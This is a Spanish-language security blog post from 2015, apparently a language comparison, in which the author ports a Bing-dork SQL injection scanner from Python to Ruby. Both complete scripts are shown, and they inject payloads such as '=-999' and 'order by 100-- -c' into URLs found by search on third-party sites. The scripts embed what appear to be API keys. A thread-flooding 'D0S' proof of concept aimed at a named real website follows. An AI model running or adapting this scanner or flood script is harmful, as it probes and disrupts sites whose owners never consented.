@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Ruby vs Python - the Same Code - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by hdbreakerBueno en esta entrada, quiero tocar este muy sensible tema dando mi punto de vista sobre ambos lenguajes en base a mi experiencia, por lo &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/02/04/ruby-vs-python-same-code/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Ruby vs Python - the Same Code</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-02-04T20:42:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:42 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"></div><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://bitboxer.de/images/2012-10-03-ruby-vs-python/ruby-vs-python.png" height="220" width="640" /></div><br /><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: right;"><br /></div><div style="text-align: left;">Bueno en esta entrada, quiero tocar este muy sensible tema dando mi punto de vista sobre ambos lenguajes en base a mi experiencia, por lo que me decidí a portar un proyecto que realice en Python a Ruby para poder compararlos.<br /><br />El proyecto: <b>Scanner de SQL Injection por Bing Dork</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Ambos lenguajes requieren importar librerías externas, ambos tienen repositorios gigantes de librerias llamadas Gemas en Ruby y Modulos en Python<br /><br />Ambos tienen excelentes <b>PackageManagers</b>&nbsp; para cumplir el requisitos de instalación y gestión de librerías y dependencias, por su lado Ruby tiene a <b>bundler</b> y Python tiene <b>pip</b>.</div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"><br />Comparemos!<br /><br /><u><b>Las dependencias:</b></u><br /><br /><b>Ruby:&nbsp;</b></div><div style="text-align: left;"></div><div style="text-align: left;"><br /></div><pre class="brush: ruby">require 'searchbing'<br />require 'unirest'<br />require 'nokogiri'<br />require 'colorize'<br /></pre><br /><div style="text-align: left;"><b>Python:</b><br /><br /><pre class="brush: py">import urllib2<br />import html2text<br />import json<br />import random<br />from colorama import Fore, Back, Style,init<br /></pre><br />La&nbsp; única diferencia entre ambos lenguajes es que python&nbsp; depende del modulo 'json' para lograr parsear la respuesta de Bing. Colorize y Colorama son los encargados de darle color a nuestras salidas de consola<br /><br /><u><b>Las Clases: </b></u><br /><br /><b>Ruby:</b><br /><br /><pre class="brush: ruby">class Main&nbsp;&nbsp;<br />  #Code Here<br />end </pre></div><div style="text-align: left;"><br /></div><b>Python:</b><br /><br /><pre class="brush: ruby">class Main():<br />&nbsp; #Code Here</pre><br />En esto la verdad, que no encuentro diferencia entre ambos lenguajes. Uno usa el bloque end y el otro Indentación<br /><br /><u><b>Inicialización:</b></u><br /><br /><b>Ruby:</b><br /><br /><pre class="brush: ruby">def initialize()<br />    @regExp = ['sql','mysql','fetch_array()','sql error', 'mysql','you have an error in your sql','division by zero in','supplied argument is not a valid mysql result resource in','call to a member function','microsoft jet database','odbc microsoft access driver','microsoft ole db provider for sql server','unclosed quotation mark','microsoft ole db provider for oracle','incorrect syntax near','microsoft jet database engine error','sql query failed','mdb2 error','server error','sql command','403 forbidden','warning: mysql_query','warning: mysql_fetch_row','warning: mysql_fetch_assoc','warning: mysql_fetch_object','warning: mysql_numrows','warning: mysql_num_rows','warning: mysql_fetch_array','warning: pg_connect','supplied argument is not a valid postgresql result','postgresql query failed: error: parser: parse error','mysql error','mysql odbc','mysql driver','supplied argument is not a valid mysql result resource','on mysql result index','oracle odbc','oracle error','oracle driver','oracle db2','microsoft jet database engine error','adodb\.command','adodb\.field error','microsoft access driver','microsoft vbscript runtime error','microsoft vbscript compilation error','microsoft ole db provider for sql server error','ole\/db provider returned message','ole db provider for odbc','odbc sql','odbc db2','oracle error','oracle driver','oracle db2','ole db provider for odbc','odbc sql','odbc db2','odbc driver','odbc error','odbc microsoft access','odbc oracle','jdbc sql','jdbc oracle','jdbc mysql','jdbc error','jdbc driver','invision power board database error','db2 odbc','db2 error','db2 driver','error in your sql syntax','unexpected end of sql command','invalid query','sql command not properly ended','error converting data type varchar to numeric','an illegal character has been found in the statement','active server pages error','asp\.net_sessionid','asp\.net is configured to show verbose error messages','a syntax error has occurred','ora-01756','error executing database query','unclosed quotation mark','bof or eof','getarray','fetchrow','input string was not in a correct format','warning: include','warning: require_once','function\.include','disallowed parent path','function\.require','warning: main','warning: session_start','warning: getimagesize','warning: mysql_result','warning: pg_exec','warning: array_merge','warning: preg_match','incorrect syntax near','ora-00921: unexpected end of sql command','warning: ociexecute','warning: ocifetchstatement','error ora-/i']<br />end<br /></pre><br /><b><br />Python:</b><br /><br /><pre class="brush: py">def __init__(self):<br />        self.arrayErrors = ['sql','mysql','fetch_array()','sql error', 'mysql','you have an error in your sql','division by zero in','supplied argument is not a valid mysql result resource in','call to a member function','microsoft jet database','odbc microsoft access driver','microsoft ole db provider for sql server','unclosed quotation mark','microsoft ole db provider for oracle','incorrect syntax near','microsoft jet database engine error','sql query failed','mdb2 error','server error','sql command','403 forbidden','warning: mysql_query','warning: mysql_fetch_row','warning: mysql_fetch_assoc','warning: mysql_fetch_object','warning: mysql_numrows','warning: mysql_num_rows','warning: mysql_fetch_array','warning: pg_connect','supplied argument is not a valid postgresql result','postgresql query failed: error: parser: parse error','mysql error','mysql odbc','mysql driver','supplied argument is not a valid mysql result resource','on mysql result index','oracle odbc','oracle error','oracle driver','oracle db2','microsoft jet database engine error','adodb\.command','adodb\.field error','microsoft access driver','microsoft vbscript runtime error','microsoft vbscript compilation error','microsoft ole db provider for sql server error','ole\/db provider returned message','ole db provider for odbc','odbc sql','odbc db2','oracle error','oracle driver','oracle db2','ole db provider for odbc','odbc sql','odbc db2','odbc driver','odbc error','odbc microsoft access','odbc oracle','jdbc sql','jdbc oracle','jdbc mysql','jdbc error','jdbc driver','invision power board database error','db2 odbc','db2 error','db2 driver','error in your sql syntax','unexpected end of sql command','invalid query','sql command not properly ended','error converting data type varchar to numeric','an illegal character has been found in the statement','active server pages error','asp\.net_sessionid','asp\.net is configured to show verbose error messages','a syntax error has occurred','ora-01756','error executing database query','unclosed quotation mark','bof or eof','getarray','fetchrow','input string was not in a correct format','warning: include','warning: require_once','function\.include','disallowed parent path','function\.require','warning: main','warning: session_start','warning: getimagesize','warning: mysql_result','warning: pg_exec','warning: array_merge','warning: preg_match','incorrect syntax near','ora-00921: unexpected end of sql command','warning: ociexecute','warning: ocifetchstatement','error ora-/i'];</pre><br /><br />Ambos lenguajes tienen su propia syntaxis para los constructores de clases<br /><br /><u><b>Funciones:</b></u><br /><br /><b>Ruby:</b><br /><br /><pre class="brush: ruby">def randomKeys()<br />        index = Random.rand(0...4);<br />        keys = ['lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','+A2dPS2Q+zU6V77Y+MgzyyJfozHevgViEMmJj4db2VE','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I'];<br />        return keys[index];<br />end<br /></pre><br /><b>Python:</b><br /><br /><pre class="brush: py">def randomKeys(self):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index = random.randrange(1,5);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; keys = ['lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','+A2dPS2Q+zU6V77Y+MgzyyJfozHevgViEMmJj4db2VE','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I'];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return keys[index];<br /><br /></pre><br />Uff me asusta lo similar de estas 2 funciones, la verdad que no encuentro mayores diferencias.<br /><br />Códigos Completos:<br /><br /><b>Ruby:</b><br /><pre class="brush: ruby">require 'searchbing'<br />require 'unirest'<br />require 'nokogiri'<br />require 'colorize'<br /><br />class Main<br /><br />  def initialize()<br />    @regExp = ['sql','mysql','fetch_array()','sql error', 'mysql','you have an error in your sql','division by zero in','supplied argument is not a valid mysql result resource in','call to a member function','microsoft jet database','odbc microsoft access driver','microsoft ole db provider for sql server','unclosed quotation mark','microsoft ole db provider for oracle','incorrect syntax near','microsoft jet database engine error','sql query failed','mdb2 error','server error','sql command','403 forbidden','warning: mysql_query','warning: mysql_fetch_row','warning: mysql_fetch_assoc','warning: mysql_fetch_object','warning: mysql_numrows','warning: mysql_num_rows','warning: mysql_fetch_array','warning: pg_connect','supplied argument is not a valid postgresql result','postgresql query failed: error: parser: parse error','mysql error','mysql odbc','mysql driver','supplied argument is not a valid mysql result resource','on mysql result index','oracle odbc','oracle error','oracle driver','oracle db2','microsoft jet database engine error','adodb\.command','adodb\.field error','microsoft access driver','microsoft vbscript runtime error','microsoft vbscript compilation error','microsoft ole db provider for sql server error','ole\/db provider returned message','ole db provider for odbc','odbc sql','odbc db2','oracle error','oracle driver','oracle db2','ole db provider for odbc','odbc sql','odbc db2','odbc driver','odbc error','odbc microsoft access','odbc oracle','jdbc sql','jdbc oracle','jdbc mysql','jdbc error','jdbc driver','invision power board database error','db2 odbc','db2 error','db2 driver','error in your sql syntax','unexpected end of sql command','invalid query','sql command not properly ended','error converting data type varchar to numeric','an illegal character has been found in the statement','active server pages error','asp\.net_sessionid','asp\.net is configured to show verbose error messages','a syntax error has occurred','ora-01756','error executing database query','unclosed quotation mark','bof or eof','getarray','fetchrow','input string was not in a correct format','warning: include','warning: require_once','function\.include','disallowed parent path','function\.require','warning: main','warning: session_start','warning: getimagesize','warning: mysql_result','warning: pg_exec','warning: array_merge','warning: preg_match','incorrect syntax near','ora-00921: unexpected end of sql command','warning: ociexecute','warning: ocifetchstatement','error ora-/i']<br />  end<br /><br />  def randomKeys()<br />    index = Random.rand(0...4);<br />    keys = ['lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','+A2dPS2Q+zU6V77Y+MgzyyJfozHevgViEMmJj4db2VE','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I'];<br />    return keys[index];<br />  end<br /><br />  def Search()<br />    urls = []<br />    print "Bing Dork: "<br />    dork = gets().chomp()<br />    bingSearch = Bing.new(randomKeys(), 99999, 'Web')<br />    results = bingSearch.search(dork)<br />    results[0][:Web].each { |res|<br />      urls.push(res[:Url])<br />    }<br />    isVulnerable(urls)<br />  end<br /><br />  def export(vulnUrls)<br /><br />    vulnUrls.each { |url|<br />      File.open("./vulnerable.txt", 'a') { |file| file.write(url+"\n") }<br />    }<br /><br />  end<br /><br />  def isVulnerable(urls)<br />    vulnerables = []<br />    vectores=['=\'','="', '=-999', '=169 order by 100-- -c']<br /><br />    urls.each { |url|<br />      vectores.each { |vector|<br />        injectedUrl=url.gsub("=",vector)<br />        request = Unirest.get(injectedUrl)<br />        responseTxt = Nokogiri::HTML(request.body).text<br />        @regExp.each { |error|<br />          begin<br />            if (responseTxt =~/#{error}/)<br />              puts "Vulnerable =&gt; ".red + injectedUrl.red<br />              vulnerables.push(injectedUrl)<br />              break<br />            else<br />              puts "Not Vulnerable =&gt; ".green + injectedUrl.green<br />              break<br />            end<br />          rescue<br />            break<br />          end<br />        }<br />      }<br />    }<br /><br />    export(vulnerables)<br />    puts "\n*******************************************"<br />    puts "*****************FINISH********************"<br />    puts "*******************************************"<br /><br />  end<br /><br />end<br /><br />if(ARGV.length&gt;=1)<br />  ARGV.each { |arg|<br />    if(arg=="--vulnerable")<br />      File.open("./vulnerable.txt", 'r') { |file| puts file.readlines()}<br />    end<br />  }<br />else<br />  main = Main.new()<br />  main.Search()<br />end<br /><br /></pre><br /><br /><br /><b>Python:</b><br /><br /><pre class="brush: py"># -*- coding: utf-8 -*-<br />import urllib2<br />import html2text<br />import json<br />import random<br />import sys;<br />import os;<br />from colorama import Fore, Back, Style<br />from colorama import init<br />init()<br />class Main():<br /><br />    def __init__(self):<br />        self.arrayErrors = ['sql','mysql','fetch_array()','sql error', 'mysql','you have an error in your sql','division by zero in','supplied argument is not a valid mysql result resource in','call to a member function','microsoft jet database','odbc microsoft access driver','microsoft ole db provider for sql server','unclosed quotation mark','microsoft ole db provider for oracle','incorrect syntax near','microsoft jet database engine error','sql query failed','mdb2 error','server error','sql command','403 forbidden','warning: mysql_query','warning: mysql_fetch_row','warning: mysql_fetch_assoc','warning: mysql_fetch_object','warning: mysql_numrows','warning: mysql_num_rows','warning: mysql_fetch_array','warning: pg_connect','supplied argument is not a valid postgresql result','postgresql query failed: error: parser: parse error','mysql error','mysql odbc','mysql driver','supplied argument is not a valid mysql result resource','on mysql result index','oracle odbc','oracle error','oracle driver','oracle db2','microsoft jet database engine error','adodb\.command','adodb\.field error','microsoft access driver','microsoft vbscript runtime error','microsoft vbscript compilation error','microsoft ole db provider for sql server error','ole\/db provider returned message','ole db provider for odbc','odbc sql','odbc db2','oracle error','oracle driver','oracle db2','ole db provider for odbc','odbc sql','odbc db2','odbc driver','odbc error','odbc microsoft access','odbc oracle','jdbc sql','jdbc oracle','jdbc mysql','jdbc error','jdbc driver','invision power board database error','db2 odbc','db2 error','db2 driver','error in your sql syntax','unexpected end of sql command','invalid query','sql command not properly ended','error converting data type varchar to numeric','an illegal character has been found in the statement','active server pages error','asp\.net_sessionid','asp\.net is configured to show verbose error messages','a syntax error has occurred','ora-01756','error executing database query','unclosed quotation mark','bof or eof','getarray','fetchrow','input string was not in a correct format','warning: include','warning: require_once','function\.include','disallowed parent path','function\.require','warning: main','warning: session_start','warning: getimagesize','warning: mysql_result','warning: pg_exec','warning: array_merge','warning: preg_match','incorrect syntax near','ora-00921: unexpected end of sql command','warning: ociexecute','warning: ocifetchstatement','error ora-/i'];<br /><br />    def randomKeys(self):<br />        index = random.randrange(1,5);<br />        keys = ['lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','+A2dPS2Q+zU6V77Y+MgzyyJfozHevgViEMmJj4db2VE','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I','lO15+W6VX/VYIFa7XCy48GZCdJoaKLkpPsi6YPKw++I'];<br />        return keys[index];<br /><br />    def Search(self,query, search_type):<br />        #search_type: Web, Image, News, Video<br />        key = self.randomKeys()<br />        query = urllib2.quote(query)<br />        # create credential for authentication<br />        user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)'<br />        credentials = (':%s' % key).encode('base64')[:-1]<br />        auth = 'Basic %s' % credentials<br />        url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/'+search_type+'?Query=%27'+query+'%27&amp;$top=100&amp;$format=json'<br />        request = urllib2.Request(url)<br />        request.add_header('Authorization', auth)<br />        request.add_header('User-Agent', user_agent)<br />        request_opener = urllib2.build_opener()<br />        response = request_opener.open(request)<br />        response_data = response.read()<br />        json_result = json.loads(response_data)<br />        urls = [res['Url'] for res in json_result['d']['results']]<br />        return urls<br /><br />    def export(self, vulnUrls):<br />        f = open("vulnerable.txt","a");<br />        f.writelines(vulnUrls + " is vulnerable" + '\n');<br />        f.close();<br /><br />    def isVulnerable(self,arrayUrl):<br />        vulnerables = []<br />        vectores=['=\'','=\"', '=-999', '=169 order by 100-- -c'];<br />        for url in arrayUrl:<br />            Url = ""+url;<br />            for vector in vectores:<br />                Url2 = Url.replace("=",vector);<br />                try:<br />                    response = ""+urllib2.urlopen(Url2).read();<br />                    page = html2text.html2text(response.decode('utf-8',errors='ignore'));<br /><br />                    contenido = page.lower();<br /><br />                    for error in self.arrayErrors:<br />                         if(contenido.find(error) &gt; -1):<br />                            print (Fore.RED + Url2 + " is vulnerable");<br />                            vulnerables.append(Url2)<br />                            break<br />                         else:<br />                            print (Fore.GREEN + Url2 + " is not vulnerable");<br />                            break<br /><br /><br /><br />                except:<br />                    print(Fore.GREEN + "Ups han error ocurred with this page!");<br /><br />        self.export(vulnerables)<br />        print "\n*******************************************"<br />        print "*****************FINISH********************"<br />        print "*******************************************"<br /><br /><br />if (len(sys.argv)&gt;= 2) and (sys.argv[1] == "--vulnerable") and (os.path.exists("vulnerable.txt")):<br />    f = open("vulnerable.txt")<br />    for lines in f:<br />        print (Fore.RED + lines.replace('\n',''));<br />else:<br />    print("*Bing Dork Exampĺe: 'Domain:.ar galeria.php?id=1'");<br />    var = raw_input("Ingrese Bing Dork: \n");<br />    main = Main()<br />    urls = main.Search(var,'Web')<br />    URLS = []<br />    for url in urls:<br />        URLS.append(url);<br />    main.isVulnerable(URLS);<br /><br /></pre><u><b>Conclusión:</b></u><br /><br />Realmente no comprendo de donde viene la disputa entre ambos lenguajes, creo que ambos son primos hermanos, comparten diferencias minimas de sintaxis, ambos son interpretados, ambos son sumamente flexibles, ambos tienen una curva de aprendizaje minima, ambos son en exceso poderosos. Ambos lenguajes son recomendados para todo programador experimentado como novato. Además portar código de uno al otro es sumamente fácil.<br /><br />Creo dar un punto de vista objetivo y técnico, comparando sus bloques estructurales, me saco la camiseta de Python y digo que ambos lenguajes son sumamente interesantes y poderosos. Creo que mucha gente se casa con un lenguaje y se olvida de que un lenguaje de programación es una herramienta.<br /><br />Cabe resaltar que como todo lenguaje tienen sus características propias y su propia sintaxis para bloques como <b>foreach</b>. Pero ningún lenguaje es limintante, y no se puede decir que con Python vas a poder hacer cosas que con Ruby no ni viceversa.<br /><b><br /></b>La diferencia mas importante que pude notar, es que Ruby trabaja con variables Locales, de Clase y Globales, mientras que en python todas las variables son globales. Siendo un programador JAVA puedo decir que me parece una forma mas correcta y segura de tratar las variales que Python.<br /><br /><b>Un punto en contra</b> para Ruby es que a la fecha&nbsp; tiene un problema al gestionar multiples hilos junto a peticiones http, dando como resultado un posible segmentation fault:<span style="color: red;"> <b>rb_sys_fail(getaddrinfo)</b></span><br /><br />He realizado un pequeñó script que logra demostrar el fallo que afecta a las versiones 1.9.3, 2.2.0 y probablemente a las versiones estables anteriores de Ruby<br /><br /><u><b>PoC:</b></u><br /><br /><pre class="brush: ruby">require 'unirest' #require 'net/http' for 1.9.3<br /><br />class Main<br /><br />  def call()<br />    Unirest.get("http://www.like4like.org/") <br />    #For 1.9.3<br />    #uri = URI('http://example.com/index.html?count=10')    <br />    #Net::HTTPget(uri)  <br />  end<br /><br />  def D0S()<br />    threads = (1..99999).map { |i|<br />      Thread.new(i){<br />        call()<br />      }<br />    }<br />    threads.each {|t| t.join}<br />  end<br /><br />end<br /><br />init = Main.new()<br />init.D0S()</pre><b></b><br /><b><u>Salida:</u></b> #full stack trace <a href="http://pastebin.com/0UpHZh53">http://pastebin.com/0UpHZh53</a><b> </b><br /><b></b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-lXw8t-q7dCM/VNMze4T5uRI/AAAAAAAAATY/VaTJhSglvr0/s1600/stack.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-lXw8t-q7dCM/VNMze4T5uRI/AAAAAAAAATY/VaTJhSglvr0/s1600/stack.png" height="194" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Si seguimos el stack trace, llegamos a la linea donde se produce el error:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-S-wIhi5dR6U/VNM0TOjXh1I/AAAAAAAAATg/Ks5gesJAtZQ/s1600/stackerror.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-S-wIhi5dR6U/VNM0TOjXh1I/AAAAAAAAATg/Ks5gesJAtZQ/s1600/stackerror.png" height="86" width="640" /></a></div><div style="text-align: center;"><br /></div><pre class="brush: ruby">TCPSocket.open(conn_address, conn_port, @local_host, @local_port) #Aqui el error </pre><br /><br />Al ser la descripcion del error <span style="color: red;"><b>rb_sys_fail(getaddrinfo)</b></span> podemos deducir que el problema se presenta al intentar obtener cierta informacion del sitio/dominio a solicitar.<br /><br />Como curiosidad <b>sin confirmar</b>, es posible de que este error pueda utilizarse para explotar el novedoso bug <a href="http://lamiradadelreplicante.com/2015/01/28/ghost-grave-vulnerabilidad-que-permitiria-el-control-de-sistemas-linux/">GHOST CVE-2015-0235</a>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-1bX-EGFIGgk/VNM2NpHcUNI/AAAAAAAAATs/tjkcgTN_OYA/s1600/Note.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-1bX-EGFIGgk/VNM2NpHcUNI/AAAAAAAAATs/tjkcgTN_OYA/s1600/Note.png" height="88" width="640" /></a></div><div style="text-align: center;"><br /></div>Por suerte el fallo ya ha sido reportado y los desarrolladores de Ruby se encuentran buscando una solución.<br /><br />Reporte:<br /><a href="https://bugs.ruby-lang.org/issues/9697">https://bugs.ruby-lang.org/issues/9697</a><br /><b></b><br /><b><br /></b><u><b>Equivalencias:</b></u><br /><br /><b>Ruby</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>=&gt;</b>&nbsp;&nbsp;&nbsp;&nbsp; <b>Python</b><br /><br />unirest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; urlib2 #requets  <br />nokogiri&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; html2text <br />colorize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; colorama  <br /><br />array.push()&nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; array.append()&nbsp; <br />urls.each&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; for item in array: <br />puts&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =&gt; &nbsp; &nbsp;&nbsp; print   </div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-02-04T20:42:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:42 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/02/04/ruby-vs-python-same-code/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/02/04/ruby-vs-python-same-code/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/02/04/securitysigalorg/" title="Previous Post: SecuritySignal.org">&laquo; SecuritySignal.org</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/02/05/smf-enhancer-of-views-dos/" title="Next Post: SMF DoS && Enhancer of Views">SMF DoS && Enhancer of Views &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
